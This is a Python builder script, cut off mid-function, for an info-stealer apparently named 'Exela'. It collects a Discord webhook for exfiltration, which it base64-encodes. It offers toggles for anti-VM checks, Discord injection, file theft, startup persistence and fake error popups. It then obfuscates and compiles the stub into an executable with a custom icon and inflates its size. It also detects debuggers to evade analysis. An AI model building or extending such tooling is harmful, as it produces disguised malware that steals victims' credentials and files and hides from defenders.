import os
import ctypes
import shutil
import sys
import re
import logging
import psutil
import json
import base64
from functools import wraps
import tkinter as tk
from tkinter import filedialog

# Configure logging
logging.basicConfig(filename='build_log.log', level=logging.INFO)

# Function to log errors
def log_error(message):
    logging.error(message)
    ctypes.windll.user32.MessageBoxW(0, message, "Error", 0x10)

# Function to encrypt webhook URL
def encrypt_webhook(webhook):
    encoded_webhook = base64.b64encode(webhook.encode('utf-8')).decode('utf-8')
    return encoded_webhook

# Function to decrypt webhook URL
def decrypt_webhook(encoded_webhook):
    return base64.b64decode(encoded_webhook.encode('utf-8')).decode('utf-8')

# Check if debugger is running
def is_debugger_present():
    debuggers = ["ollydbg", "x64dbg", "windbg"]
    for process in psutil.process_iter():
        if any(debugger in process.name().lower() for debugger in debuggers):
            return True
    return False

# Function decorator for error handling
def handle_errors(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            log_error(f"Error in {func.__name__}: {e}")
    return wrapper

# Class for building the Exela
class Build:
    def __init__(self) -> None:
        # Initialize various attributes used in the build process
        self.webhook = None
        self.StealFiles = bool()
        self.Anti_VM = bool()
        self.startup = bool()
        self.StartupMethod = None
        self.injection = bool()
        self.fakeError = bool()
        self.current_path = os.getcwd()
        self.pump = bool()
        self.pumSize = int()  # mb
        self.PyInstallerCommand = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt"

    @handle_errors
    def CallFuncions(self) -> None:
        # Call various functions to gather user input and perform build steps
        self.GetWebhook()
        self.GetAntiVm()
        self.GetDiscordInjection()
        self.GetStealFiles()
        self.GetStartupMethod()
        self.GetFakeError()
        self.GetIcon()
        self.PumpFile()
        self.WriteSettings()
        os.system("cls")
        self.ObfuscateFile("Stub.py")
        self.build_file()
        shutil.copy("dist\\stub.exe", "stub.exe")
        if self.pump == True:
            self.expand_file("stub.exe", self.pumSize)
        try:
            shutil.rmtree("dist")
            shutil.rmtree("build")
            os.remove("stub.py")
            os.remove("stub.spec")
        except:
            pass
        if os.path.exists("stub.exe"):
            os.rename("stub.exe", "Exela.exe")
        print("\nfile compiled, close the window")
        os.system("start .")
        ctypes.windll.user32.MessageBoxW(0, "Your file compiled successfully, now you can close the window.", "Information", 0x40)
        while True:
            continue

    def PumpFile(self) -> None:
        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo you want to pump the file: "))
        if pump_q.lower() == "y" or pump_q.lower() == "yes":
            pump_size = int(input("How much mb size do you want to pump: "))
            self.pump = True
            self.pumSize = pump_size
        else:
            self.pump = False

    @handle_errors
    def expand_file(self, file_name, additional_size_mb) -> None:
        if os.path.exists(file_name):
            additional_size_bytes = additional_size_mb * 1024 * 1024
            with open(file_name, "ab") as file:
                empty_bytes = bytearray([0x00] * additional_size_bytes)
                file.write(empty_bytes)
                print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')

    @handle_errors
    def build_file(self) -> None:
        os.system(self.PyInstallerCommand)

    @handle_errors
    def WriteSettings(self) -> None:
        with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
            data.replace("%WEBHOOK%", encrypt_webhook(self.webhook))
            .replace('"%Anti_VM%"', str(self.Anti_VM))
            .replace('"%injection%"', str(self.injection))
            .replace("%startup_method%", str(self.StartupMethod))
            .replace('"%fake_error%"', str(self.fakeError))
            .replace('"%StealCommonFiles%"', str(self.StealFiles))
        )
        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
            laquica.write(replaced_data)

    @handle_errors
    def ObfuscateFile(self, input_file) -> None:
        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
        os.system(f'python "{obf_file}" "{input_file}" stub.py')

    @handle_errors
    def GetIcon(self) -> None:
        get_icon = str(input("Yes/No\nDo you want to change the icon of the file: "))
        if get_icon.lower() == "yes" or get_icon.lower() == "y":
            get_icon_path = self.select_icon()
            if not get_icon_path.endswith(".ico"):
                print("Please use .ico file, now icon change has been disabled")
                self.PyInstallerCommand += " --icon=NONE stub.py"
            else:
                if not os.path.isfile(get_icon_path):
                    print("File does not exist, icon change has been disabled.")
                    self.PyInstallerCommand += " --icon=NONE stub.py"
                else:
                    if self.CheckIcoFile(get_icon_path):
                        self.PyInstallerCommand += f" --icon={get_icon_path} stub.py"
                    else:
                        print("Your file doesn't contain a .ico file, icon change has been disabled")
                        self.PyInstallerCommand += " --icon=NONE stub.py"
        else:
            self.PyInstallerCommand += " --icon=NONE stub.py"

    @handle_errors
    def CheckIcoFile(self, file_path: str) -> bool:
        try:
            ico_header = b"\x00\x00\x01\x00"  # ico header
            with open(file_path, "rb") as file:
                header_data = file.read(4)
            return header_data == ico_header
        except:
            return False

    def select_icon(self) -> str:
        root = tk.Tk()
        root.withdraw()
        icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        return icon_path

    @handle_errors
    def GetFakeError(self) -> None:
        try:
            er = str(input("Yes/No\nDo you want to use fake Error: "))
            if er.lower() == "yes" or er.lower() == "y
